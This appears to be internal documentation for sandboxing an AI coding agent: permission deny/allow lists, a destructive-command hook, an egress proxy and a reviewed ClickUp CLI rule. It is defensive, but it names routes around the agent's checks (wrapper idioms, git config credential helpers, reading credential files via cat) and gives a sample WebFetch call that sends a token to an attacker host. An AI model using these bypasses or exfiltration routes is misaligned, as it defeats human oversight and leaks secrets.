# Permissions posture and exfil channels

The deny/allow model in `sandbox_templates/claude/claude-settings.json`, the two-phase planning/autonomous workflow, and the channels (WebFetch, Read tool denies, deny-destructive hook) that need explicit operator awareness.

The hook ruleset itself lives in `docs/deny-destructive-hook-plan.md`. This page is the surrounding model.

## Two-phase workflow

- **Planning runs** (you driving, approving each step): uncomment the planning-mode section in `proxy/allowed_domains.txt` (pypi/npm/git), restart Squid, do clones/installs/pushes yourself. `permissions.defaultMode: "auto"` means Bash is prompt-gated for commands not on the allow list.
- **Autonomous runs** (agent driving): re-comment the planning-mode domains, restart Squid. The agent's allow list covers routine read-only / non-destructive Bash; deny list blocks network tools (`curl`, `wget`, `ssh`, `scp`, `rsync`, `git push/clone/fetch`, `gh`, `glab`), package installers (`pip`, `npm`/`npx`, `pnpm`, `yarn`, `bun`, `uv` incl. `uv sync`/`uv lock`, `poetry`, `pipx`, `cargo`, `go install`), shell-escape patterns (`bash -c`, `python -c`, `node -e`, `uv run bash`, `perl`, `ruby`, `lua`, `env`, `xargs`, `eval`), and `awk` (gawk's `system()`), `sed` (gnu sed's `e` command), `ssh-keygen`, `git submodule` (fetches via configured URL, bypasses the `git fetch` deny), and `git config` (could rewrite `credential.helper` to a host-reaching shim between scrub passes).

`WebSearch` stays on; **`WebFetch` is intentionally OFF the default allow list** — see below.

## Deny list is defense in depth, not the boundary

Claude Code's permission matcher keys on the command prefix; denies can be routed around by wrapper idioms hard to enumerate exhaustively (`find -exec`, `make`, `npm run`, `<interpreter> /tmp/script.<ext>`). When the deny list misses, the real boundary still holds: egress proxy (domain + port allowlist), seccomp (no user namespaces), rootless Docker userns (container root = host UID 1000) + `cap_drop: ALL`.

The deny-destructive `PreToolUse` hook extends coverage to destructive primitives reachable through allowed prefixes (`find -delete`/`-exec`/`-execdir`/`-ok`, `git clean -fdx`, `shred`, `truncate`, `dd of=`, `mkfs`) and to writes targeting the hook/settings files themselves. The prefix matcher in `permissions.deny` remains the primary filter; the hook is the content-aware secondary layer for what the prefix matcher structurally can't see. See `docs/deny-destructive-hook-plan.md` for ruleset and maintenance.

## The discipline

If the agent says it needs a new package or fresh clone, that's a planning-phase signal — exit autonomous mode, you do it, resume. Don't widen agent permissions for one-off installs.

For one-shot planning-mode installs, `scripts/with-egress.sh` automates the toggle/restart/exec/restore loop:

```bash
scripts/with-egress.sh <p> -- '<cmd>'
scripts/with-egress.sh <p> --with pypi,npm -- '<cmd>'
```

## Reviewed allow-list decision: `myclickup` reads yes, writes prompt

The image bakes `myclickup`, a CLI over the ClickUp REST API with a 19-command
surface: 13 reads and 6 writes (`create`/`update`/`claim`/`comment`/`tag`/`untag`).
The template allows **the 13 reads and nothing else**, so every write hits the
`defaultMode: auto` prompt. This was chosen over the obvious one-liner
`Bash(myclickup:*)` — that would have let an agent create and comment on real
tasks in a shared workspace unprompted, and `--dry-run` being available does not
make it a gate, because opting into it is the agent's choice.

Two details make the split hold rather than merely look tidy:

- **No allowed entry is a prefix of a write.** `comments` (allowed; reads a
  task's comments) cannot match `comment <id> …` — the longer string is the
  command, so prefix matching runs the other way. The reverse over-match,
  `Bash(myclickup task:*)` also matching `tasks …`, is harmless: both are reads.
- **`Bash(myclickup --dry-run:*)` is what makes reads-only workable.** The
  permission prompt shows argv, not what argv resolves to: `--list
  "Team/Build/Action Items"` becomes a list ID and `--due 2026-09-01` becomes
  epoch-ms. A dry-run prints the resolved request, so the human approves
  something they have actually seen. The tool accepts the flag **before** the
  subcommand (its ADR-0007) specifically so a prefix pattern can match it —
  the trailing form is indistinguishable from a live write to a prefix matcher.
  Verified 2026-08-10 that a dry-run needs no token at all, so the inert form is
  inert even in a profile with no ClickUp credential.

`permissions.deny` also carries `Bash(myclickup delete:*)` and
`Bash(myclickup rm:*)` as **forward guards**. Neither command exists today (the
only HTTP `DELETE` in the tool is `untag`, which removes a tag, not an object).
They cost nothing and mean a future version that adds deletion arrives denied
rather than silently newly-permitted — the allow list is reviewed when it is
written, the CLI is upgraded by image rebuild, and those two events are months
apart.

The accepted residual is the one this page already names: `Bash(just:*)` and
`Bash(make:*)` are allowed, so a workspace recipe wrapping a write runs
unprompted. That is wrapper routing, not a myclickup-specific hole, and the
boundary that still holds is egress — `api.clickup.com` is reachable, but the
token is env-injected and never appears on argv or in the Squid URL log.

## `Read(**/.credentials*)` denies are nudges, not gates

The `Read` deny list in `sandbox_templates/claude/claude-settings.json` only governs the **Read tool**. Reading the same files via `Bash(cat:*)`, `Bash(jq:*)`, `Bash(python /tmp/x.py)` etc. is allowed by the corresponding Bash entries — those entries exist for legitimate workflow reasons. The Read denies still narrow the most natural read path; they don't seal it. Don't overclaim them as a containment boundary.

## WebFetch is server-side egress that bypasses the proxy

`WebFetch` runs **on Anthropic's infrastructure**, not inside the container — every URL passed to it is fetched from outside the sandbox network entirely. The destination server logs the request URL, which means the path/query is a covert exfil channel: `WebFetch("https://attacker.tld/log?token=…")` works regardless of `proxy/allowed_domains.txt`.

The template (`sandbox_templates/claude/claude-settings.json`) intentionally omits the bare `WebFetch` entry from the allow list. Per-project `.claude/settings.local.json` should add narrowly-scoped patterns like `WebFetch(domain:docs.example.com)`. **Do not add bare `WebFetch` back to the template's allow list.**
